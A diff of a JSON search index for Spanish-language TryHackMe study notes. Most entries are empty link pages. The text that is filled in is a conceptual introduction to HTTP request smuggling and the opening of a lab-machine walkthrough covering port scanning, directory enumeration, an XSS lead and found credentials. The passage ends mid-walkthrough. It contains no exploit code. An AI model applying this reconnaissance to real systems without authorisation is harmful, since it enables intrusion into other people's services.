@@ -5172,8 +5172,8 @@
     "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/5-http-request-smuggling/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/5. HTTP Request Smuggling.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling",
-    "content": "",
-    "modified": "2025-12-12T13:58:55"
+    "content": "1. [[0. HTTP Request Smuggling]]\n2. [[0. HTTP-2 Request Smuggling]]\n3. [[0. Request Smuggling - WebSockets]]\n4. [[0. HTTP Browser Desync]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/5. El Bandito/0. El Bandito]]",
+    "modified": "2026-03-03T17:02:38"
   },
   {
     "title": "2. Injection Attacks",
@@ -5510,6 +5510,254 @@
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
     "content": "[[1. Key Concepts]]\n[[2. OAuth Grant Types]]\n[[3. How OAuth Flow Works]]\n[[4. Identifying the OAuth Services]]\n[[5. Exploiting OAuth - Stealing OAuth Token]]\n[[6. Exploiting OAuth - CSRF in OAuth]]\n[[7. Exploiting OAuth - Implicit Grant Flow]]\n[[8. Other Vulnerabilities and Evolution of OAuth 2.1]]",
     "modified": "2025-12-12T13:58:55"
+  },
+  {
+    "title": "0. El Bandito",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/5-el-bandito/0-el-bandito/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/5. El Bandito/0. El Bandito.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 5. El Bandito",
+    "content": "[[Ciberseguridad/THM/Maquinas/3. Hard/1. El Bandito/0. El Bandito]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/5. El Bandito/1. Redirection]]",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "1. Redirection",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/5-el-bandito/1-redirection/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/5. El Bandito/1. Redirection.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 5. El Bandito",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "7. Challenge Help",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/7-challenge-help/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/7. Challenge Help.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "0. HTTP Browser Desync",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/0-http-browser-desync/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/0. HTTP Browser Desync.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/1. Introduction]]\n[[2. HTTP features]]\n[[3. HTTP Browser Desync]]\n[[4. HTTP Browser Desync Identification]]\n[[5. HTTP Browser Desync Exploit Chaining XSS]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/6. Challenge]]\n[[7. Challenge Help]]",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/1-introduction/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/1. Introduction.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "5. HTTP Browser Desync Exploit Chaining XSS",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/5-http-browser-desync-exploit-chaining-xss/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/5. HTTP Browser Desync Exploit Chaining XSS.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "4. HTTP Browser Desync Identification",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/4-http-browser-desync-identification/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/4. HTTP Browser Desync Identification.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "2. HTTP features",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/2-http-features/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/2. HTTP features.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "6. Challenge",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/6-challenge/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/6. Challenge.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "3. HTTP Browser Desync",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/4-http-browser-desync/3-http-browser-desync/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/4. HTTP Browser Desync/3. HTTP Browser Desync.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 4. HTTP Browser Desync",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "2. Abusing Websockets for Request Smuggling",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/3-request-smuggling-websockets/2-abusing-websockets-for-request-smuggling/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/3. Request Smuggling - WebSockets/2. Abusing Websockets for Request Smuggling.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 3. Request Smuggling - WebSockets",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "0. Request Smuggling - WebSockets",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/3-request-smuggling-websockets/0-request-smuggling-websockets/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/3. Request Smuggling - WebSockets/0. Request Smuggling - WebSockets.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 3. Request Smuggling - WebSockets",
+    "content": "[[1. WebSockets]]\n[[2. Abusing Websockets for Request Smuggling]]\n[[3. Defeating Secure Proxies]]",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "1. WebSockets",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/3-request-smuggling-websockets/1-websockets/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/3. Request Smuggling - WebSockets/1. WebSockets.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 3. Request Smuggling - WebSockets",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "3. Defeating Secure Proxies",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/3-request-smuggling-websockets/3-defeating-secure-proxies/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/3. Request Smuggling - WebSockets/3. Defeating Secure Proxies.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 3. Request Smuggling - WebSockets",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "8. Conclusion",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/8-conclusion/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/8. Conclusion.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "5. Request Smuggling TE CL",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/5-request-smuggling-te-cl/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/5. Request Smuggling TE CL.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "4. Request Smuggling CL TE",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/4-request-smuggling-cl-te/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/4. Request Smuggling CL TE.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/1-introduction/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/1. Introduction.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "<h2>Introducción</h2>\nEl contrabando de peticiones HTTP es una vulnerabilidad que surge cuando hay falta de coincidencia entre diferentes componentes de infraestructura web. Esto incluye proxies, balanceadores de carga y servidores que interpretan las fronteras de las peticiones HTTP. Por ejemplo, considera una estación de tren donde los tickets son comprobados en múltiples puntos antes de embarcar. Si cada punto de control tiene criterios diferentes para validar el ticket, un viajero podría explotar estas inconsistencias para embarcar al tren sin un ticket válido. De forma similar, en las peticiones web, esta vulnerabilidad involucra principalmente la longitud del contenido y los headers de encoding de transferencia, los cuales  indican el final del body de una petición. Cuando estos headers son manipulados o interpretados de forma inconsistente a lo largo de los componentes, puede resultar en una petición mezclada con otra.\n\n![[Pasted image 20260303164344.png]]\n\nLos ataques de partición de peticiones o HTTP desync son posibles por la naturaleza keep-alive de las conexiones y pipelining HTTP, la cual permite que múltiples peticiones se manden por la misma conexión TCP. Cuando se calcula el tamaño de Content-Length (CL) y Transfer-Encoding (TE), es crucial considerar la presencia de los caracteres carriage return (`\\r`) y newline (`\\n`). Estos caracteres no sólo son parte del formateo del protocolo HTTP sino que también impactan al cálculo del tamaño de los contenidos.\n\nAl comprobar vulnerabilidades de contrabando HTTP, es importante saber que algunas herramientas pueden \"arreglar\" automáticamente el header Content-Length por defecto. Esto significa que si estamos usando dichas herramientas para correr payloads, nuestros valores Content-Length pueden ser sobrescritos, potencialmente cambiando los resultados.\n\n>[!CAUTION] Testear en busca de request smuggling puede potencialente romper un sitio web de varias maneras (cache poisoning, las peticiones de otros usuarios pueden falar, o incluso la pipeline del backend puede desincronizarse), por lo que debemos tener extremada precaución al probar esto en una web en producción.\n\n-------------------------------\n<h2>Objetivos</h2>\n1. Entender qué es HTTP Request Smuggling y su impacto.\n2. Identificar vulnerabilidades HTTP Request Smuggling en aplicaciones web.\n3. Explotar estas vulnerabilidades en un entorno controlado.\n4. Entender y aplicar medidas para mitigar y prevenir estas vulnerabilidades.\n\n--------------------------------\n<h2>Pre-requisitos</h2>\n1. Entendimiento básico del protocolo HTTP/1.1 y sus headers.\n2. Familiaridad con componentes de infraestructura web como balanceadores de carga, proxies y servidores web.\n3. Entendimiento básico y uso de una herramienta de proxy como BurpSuite.\n\n-------------------------------------\n<h2>Importancia de Entender HTTP Request Smuggling</h2>\n1. Las peticiones de contrabando pueden evadir mecanismos de seguridad como WAF.\n2. Los atacantes pueden contaminar la cache web haciendo contrabando de contenido malicioso, haciendo que los usuario vean información errónea o maliciosa.\n3. Las peticiones de contrabando pueden ser encadenadas para explotar otras vulnerabilidades en el sistema, amplificando el daño potencial.\n4. Debido a su naturaleza intrincada, suelen pasar desapercibidas, lo que hace que sea crucial entenderlas para los profesionales de la ciberseguridad.",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "3. Behind the Scenes",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/3-behind-the-scenes/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/3. Behind the Scenes.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "6. Transfer Encoding Obfuscation",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/6-transfer-encoding-obfuscation/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/6. Transfer Encoding Obfuscation.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "2. Modern Infrastructure",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/2-modern-infrastructure/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/2. Modern Infrastructure.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "<h2>Componentes de las Aplicaciones Web Modernas</h2>\nLas aplicaciones web modernas no son ya estructuras monolíticas. Están compuestas por diferentes componente que trabajan unos con otros. Debajo hay algunos de los componentes que forman las aplicaciones modernas:",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "7. Walkthrough",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/7-walkthrough/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/7. Walkthrough.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "0. HTTP Request Smuggling",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/1-http-request-smuggling/0-http-request-smuggling/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/0. HTTP Request Smuggling.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 1. HTTP Request Smuggling",
+    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/1. Introduction]]\n[[2. Modern Infrastructure]]\n[[3. Behind the Scenes]]\n[[4. Request Smuggling CL TE]]\n[[5. Request Smuggling TE CL]]\n[[6. Transfer Encoding Obfuscation]]\n[[7. Walkthrough]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/1. HTTP Request Smuggling/8. Conclusion]]",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "7. h2c Smuggling",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/7-h2c-smuggling/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/7. h2c Smuggling.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "4. HTTP-2 Request Tunneling - Leaking Internal Headers",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/4-http-2-request-tunneling-leaking-internal-headers/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/4. HTTP-2 Request Tunneling - Leaking Internal Headers.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "0. HTTP-2 Request Smuggling",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/0-http-2-request-smuggling/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/0. HTTP-2 Request Smuggling.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "[[1. HTTP-2 Explained]]\n[[2. HTTP-2 Desync]]\n[[3. HTTP-2 Request Tunneling]]\n[[4. HTTP-2 Request Tunneling - Leaking Internal Headers]]\n[[5. HTTP-2 Request Tunneling - Bypassing Frontend Restrictions]]\n[[6. HTTP-2 Request Tunneling - Web Cache Poisoning]]\n[[7. h2c Smuggling]]",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "5. HTTP-2 Request Tunneling - Bypassing Frontend Restrictions",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/5-http-2-request-tunneling-bypassing-frontend-restrictions/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/5. HTTP-2 Request Tunneling - Bypassing Frontend Restrictions.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "1. HTTP-2 Explained",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/1-http-2-explained/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/1. HTTP-2 Explained.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "2. HTTP-2 Desync",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/2-http-2-desync/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/2. HTTP-2 Desync.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "3. HTTP-2 Request Tunneling",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/3-http-2-request-tunneling/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/3. HTTP-2 Request Tunneling.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "6. HTTP-2 Request Tunneling - Web Cache Poisoning",
+    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/2-http-2-request-smuggling/6-http-2-request-tunneling-web-cache-poisoning/",
+    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/2. HTTP-2 Request Smuggling/6. HTTP-2 Request Tunneling - Web Cache Poisoning.md",
+    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling > 2. HTTP-2 Request Smuggling",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
   },
   {
     "title": "3. Operator Injection - Bypassing the Login Screen",
@@ -7548,8 +7796,8 @@
     "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/0-burp-suite-repeater/",
     "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater.md",
     "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
-    "content": "[[1. What is Repeater]]\n[[2. Basic Usage]]\n[[3. Message Analysis Toolbar]]\n[[4. Inspector]]\n[[5. Practical Example]]\n[[6. Challenge]]\n[[7. Extra-mile Challenge]]",
-    "modified": "2025-12-12T13:58:55"
+    "content": "[[1. What is Repeater]]\n[[2. Basic Usage]]\n[[3. Message Analysis Toolbar]]\n[[4. Inspector]]\n[[5. Practical Example]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/6. Challenge]]\n[[7. Extra-mile Challenge]]",
+    "modified": "2026-03-03T17:02:38"
   },
   {
     "title": "5. Practical Example",
@@ -8929,6 +9177,30 @@
   },
   {
     "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/3-hard/1-el-bandito/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/3. Hard/1. El Bandito/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 3. Hard > 1. El Bandito",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "0. El Bandito",
+    "path": "/apuntes/thm/maquinas/3-hard/1-el-bandito/0-el-bandito/",
+    "src": "content/Ciberseguridad/THM/Maquinas/3. Hard/1. El Bandito/0. El Bandito.md",
+    "breadcrumb": "THM > Maquinas > 3. Hard > 1. El Bandito",
+    "content": "[[Ciberseguridad/THM/Maquinas/3. Hard/1. El Bandito/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/3. Hard/1. El Bandito/2. Getting the Flags]]",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/3-hard/1-el-bandito/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/3. Hard/1. El Bandito/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 3. Hard > 1. El Bandito",
+    "content": "",
+    "modified": "2026-03-03T17:02:38"
+  },
+  {
+    "title": "1. Introduction",
     "path": "/apuntes/thm/maquinas/2-medium/4-rabbit-store/1-introduction/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/4. Rabbit Store/1. Introduction.md",
     "breadcrumb": "THM > Maquinas > 2. Medium > 4. Rabbit Store",
@@ -9132,8 +9404,8 @@
     "path": "/apuntes/thm/maquinas/2-medium/9-whats-your-name/1-getting-the-flags/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/1. Getting the flags.md",
     "breadcrumb": "THM > Maquinas > 2. Medium > 9. Whats Your Name",
-    "content": "",
-    "modified": "2026-02-15T01:10:58"
+    "content": "<h2>Escaneo Inicial</h2>\n1. Primero, como siempre, empezamos mirando los puertos.\n   ![[Pasted image 20260303123326.png]]\n2. Después hacemos un segundo escaneo sobre los puertos abiertos que hemos visto.\n   ![[Pasted image 20260303123459.png]]\n   Y ojo, porque aquí vemos algo bastante interesante: `httponly: false`.\n   ![[Pasted image 20260303123612.png]]\n   Por lo que es probable que debamos de usar un XSS en algún momento.\n3. Una vez tenemos estos resultados, vamos a enumerar contenido web de los puertos `80` y `8081` (Apache) . Usaremos `dirsearch`, una herramienta genial para la enumeración web (tanto de directorios como de archivos).\n\t1. Primero para `worldwap.thm`:\n\t   ![[Pasted image 20260303123928.png]]\n\t2. Vamos a seguir con el directorio `public/` que es donde estará la web.\n\t   ![[Pasted image 20260303124109.png]]\n\t   De aquí nos interesa el directorio `html/`:\n\t   ![[Pasted image 20260303124220.png]]\n\t3. Ahora vamos con `worldwap.thm:8081`:\n\t   ![[Pasted image 20260303124416.png]]\n\nEn esta fase hemos encontrado cosas bastante interesantes. Hemos visto:\n\n- Un posible vector de ataque XSS (por flag `HttpOnly` not set).\n- Una serie de páginas y scripts que parece que podemos usar para registrarnos, iniciar sesión y cerrar sesión.\n- Una serie de documentos no vacíos que nos generan curiosidad como `admin.py` o `setup.php`.\n\n-------------------------------------------------\n<h2>Profundización</h2>\nVamos a empezar leyendo los documentos que más curiosidad nos generan:\n\n1. `setup.php`:\n   ![[Pasted image 20260303124807.png]]\n2. `admin.py`:\n   ![[Pasted image 20260303124917.png]]\n   Hemos encontrado credenciales, y de hecho funcionan, las he probado, pero no creo que esta sea la forma en la que el creador pretendía que hiciéramos la máquina, por lo que no las usaremos.\n\nUna vez hecho esto vamos a profundizar en la web. Comenzaremos por `worldwap.thm`.\n\n1. Comenzamos yendo a la página tal cual:\n   ![[Pasted image 20260303125130.png]]\n   Pero aquí no podemos ni navegar ni interactuar con ningún botón.\n2. Vamos a 